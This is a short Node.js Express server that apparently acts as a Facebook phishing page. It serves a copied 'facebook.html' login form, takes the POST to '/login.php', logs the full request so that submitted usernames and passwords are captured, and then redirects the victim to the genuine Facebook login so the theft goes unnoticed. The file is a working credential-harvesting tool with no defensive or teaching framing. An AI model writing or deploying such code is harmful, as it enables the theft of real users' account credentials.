const express = require('express')
const bodyParser = require('body-parser')
const app = express()
const port = 3000
const path = require("path")

app.use(express.static("./public"))
app.use(bodyParser.urlencoded({ exteded: true }))

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname,'./public/facebook.html'))
})

app.post('/login.php',(req,res) => {
  console.log(req)
  res.redirect(301, "https://es-la.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjIwOTU0NjMxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D")
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})